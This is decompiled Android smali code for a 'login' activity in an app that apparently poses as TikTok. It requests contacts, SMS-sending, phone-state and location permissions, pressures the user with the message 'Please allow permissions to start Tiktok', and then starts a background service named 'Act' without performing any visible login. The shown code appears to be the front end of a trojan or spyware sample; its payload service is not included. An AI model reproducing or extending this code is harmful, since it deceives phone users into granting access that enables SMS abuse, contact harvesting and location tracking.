.class public Lcom/jadhalno/goplotu/login;
.super La/b/k/c;
.source "login.java"


# instance fields
.field public o:Landroid/widget/Button;

.field public p:Landroid/widget/EditText;

.field public q:Landroid/widget/EditText;

.field public r:Landroid/app/ProgressDialog;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, La/b/k/c;-><init>()V

    return-void
.end method


# virtual methods
.method public final F()Z
    .locals 6

    .line 136
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "android.permission.READ_CONTACTS"

    invoke-static {v0, v1}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    .line 137
    .local v0, "result":I
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "android.permission.SEND_SMS"

    invoke-static {v1, v2}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    .line 138
    .local v1, "result1":I
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "android.permission.READ_PHONE_STATE"

    invoke-static {v2, v3}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    .line 139
    .local v2, "result2":I
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v3, v4}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    .line 140
    .local v3, "result3":I
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v4, v5}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    .line 142
    .local v4, "result4":I
    if-nez v0, :cond_0

    if-nez v1, :cond_0

    if-nez v2, :cond_0

    if-nez v3, :cond_0

    if-nez v4, :cond_0

    const/4 v5, 0x1

    goto :goto_0

    :cond_0
    const/4 v5, 0x0

    :goto_0
    return v5
.end method

.method public final G()V
    .locals 5

    .line 147
    const-string v0, "android.permission.READ_CONTACTS"

    const-string v1, "android.permission.SEND_SMS"

    const-string v2, "android.permission.READ_PHONE_STATE"

    const-string v3, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v4, "android.permission.ACCESS_FINE_LOCATION"

    filled-new-array {v0, v1, v2, v3, v4}, [Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0xc8

    invoke-static {p0, v0, v1}, La/f/d/a;->h(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 149
    return-void
.end method

.method public H()V
    .locals 4

    .line 205
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 206
    .local v0, "c":Ljava/util/Calendar;
    const/16 v1, 0xc

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    .line 207
    .local v1, "min":I
    if-ltz v1, :cond_0

    const/16 v2, 0xa

    if-gt v1, v2, :cond_0

    .line 208
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 209
    :cond_0
    const/16 v2, 0xb

    if-lt v1, v2, :cond_1

    const/16 v2, 0x14

    if-gt v1, v2, :cond_1

    .line 210
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 211
    :cond_1
    const/16 v2, 0x15

    if-lt v1, v2, :cond_2

    const/16 v2, 0x1e

    if-gt v1, v2, :cond_2

    .line 212
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 213
    :cond_2
    const/16 v2, 0x1f

    if-lt v1, v2, :cond_3

    const/16 v2, 0x28

    if-gt v1, v2, :cond_3

    .line 214
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 215
    :cond_3
    const/16 v2, 0x29

    if-lt v1, v2, :cond_4

    const/16 v2, 0x32

    if-gt v1, v2, :cond_4

    .line 216
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 218
    :cond_4
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/jadhalno/goplotu/Act;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 220
    :goto_0
    return-void
.end method

.method public final I(Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V
    .locals 3
    .param p1, "message"    # Ljava/lang/String;
    .param p2, "okListener"    # Landroid/content/DialogInterface$OnClickListener;

    .line 196
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 197
    invoke-virtual {v0, p1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 198
    const-string v1, "OK"

    invoke-virtual {v0, v1, p2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 199
    const-string v1, "Cancel"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 200
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    .line 201
    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    .line 202
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 38
    invoke-super {p0, p1}, La/b/k/c;->onCreate(Landroid/os/Bundle;)V

    .line 39
    const v0, 0x7f0a001e

    invoke-virtual {p0, v0}, La/b/k/c;->setContentView(I)V

    .line 40
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/login;->F()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 42
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/login;->H()V

    goto :goto_0

    .line 44
    :cond_0
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/login;->G()V

    .line 46
    :goto_0
    const v0, 0x7f070043

    invoke-virtual {p0, v0}, La/b/k/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/jadhalno/goplotu/login;->o:Landroid/widget/Button;

    .line 47
    const v0, 0x7f070056

    invoke-virtual {p0, v0}, La/b/k/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/jadhalno/goplotu/login;->p:Landroid/widget/EditText;

    .line 48
    const v0, 0x7f070057

    invoke-virtual {p0, v0}, La/b/k/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/jadhalno/goplotu/login;->q:Landroid/widget/EditText;

    .line 50
    new-instance v0, Landroid/app/ProgressDialog;

    invoke-direct {v0, p0}, Landroid/app/ProgressDialog;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/jadhalno/goplotu/login;->r:Landroid/app/ProgressDialog;

    .line 51
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setCancelable(Z)V

    .line 52
    iget-object v0, p0, Lcom/jadhalno/goplotu/login;->r:Landroid/app/ProgressDialog;

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setProgressStyle(I)V

    .line 53
    iget-object v0, p0, Lcom/jadhalno/goplotu/login;->r:Landroid/app/ProgressDialog;

    new-instance v1, Lcom/jadhalno/goplotu/login$a;

    invoke-direct {v1, p0}, Lcom/jadhalno/goplotu/login$a;-><init>(Lcom/jadhalno/goplotu/login;)V

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setOnDismissListener(Landroid/content/DialogInterface$OnDismissListener;)V

    .line 105
    iget-object v0, p0, Lcom/jadhalno/goplotu/login;->o:Landroid/widget/Button;

    new-instance v1, Lcom/jadhalno/goplotu/login$b;

    invoke-direct {v1, p0}, Lcom/jadhalno/goplotu/login$b;-><init>(Lcom/jadhalno/goplotu/login;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 133
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 7
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .line 153
    const/16 v0, 0xc8

    if-eq p1, v0, :cond_0

    goto/16 :goto_4

    .line 156
    :cond_0
    array-length v0, p3

    if-lez v0, :cond_7

    .line 158
    const/4 v0, 0x0

    aget v1, p3, v0

    const/4 v2, 0x1

    if-nez v1, :cond_1

    move v1, v2

    goto :goto_0

    :cond_1
    move v1, v0

    .line 159
    .local v1, "locationAccepted":Z
    :goto_0
    aget v3, p3, v2

    if-nez v3, :cond_2

    move v3, v2

    goto :goto_1

    :cond_2
    move v3, v0

    .line 160
    .local v3, "cameraAccepted":Z
    :goto_1
    const/4 v4, 0x2

    aget v4, p3, v4

    if-nez v4, :cond_3

    move v4, v2

    goto :goto_2

    :cond_3
    move v4, v0

    .line 161
    .local v4, "readphonestate":Z
    :goto_2
    const/4 v5, 0x3

    aget v5, p3, v5

    if-nez v5, :cond_4

    move v5, v2

    goto :goto_3

    :cond_4
    move v5, v0

    .line 162
    .local v5, "sendsms":Z
    :goto_3
    const/4 v6, 0x4

    aget v6, p3, v6

    if-nez v6, :cond_5

    move v0, v2

    .line 164
    .local v0, "readcontacts":Z
    :cond_5
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "PERMISSION "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " code"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v6, "INFOS"

    invoke-static {v6, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 165
    if-eqz v1, :cond_6

    if-eqz v3, :cond_6

    if-eqz v4, :cond_6

    if-eqz v5, :cond_6

    if-eqz v0, :cond_6

    .line 166
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/login;->H()V

    .line 167
    const-string v2, "PERMISSION accepted"

    invoke-static {v6, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_4

    .line 169
    :cond_6
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/login;->G()V

    .line 171
    nop

    .line 172
    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, v2}, Landroid/app/Activity;->shouldShowRequestPermissionRationale(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_7

    .line 173
    new-instance v2, Lcom/jadhalno/goplotu/login$c;

    invoke-direct {v2, p0}, Lcom/jadhalno/goplotu/login$c;-><init>(Lcom/jadhalno/goplotu/login;)V

    const-string v6, "Please allow permissions to start Tiktok"

    invoke-virtual {p0, v6, v2}, Lcom/jadhalno/goplotu/login;->I(Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    .line 183
    return-void

    .line 193
    .end local v0    # "readcontacts":Z
    .end local v1    # "locationAccepted":Z
    .end local v3    # "cameraAccepted":Z
    .end local v4    # "readphonestate":Z
    .end local v5    # "sendsms":Z
    :cond_7
    :goto_4
    return-void
.end method
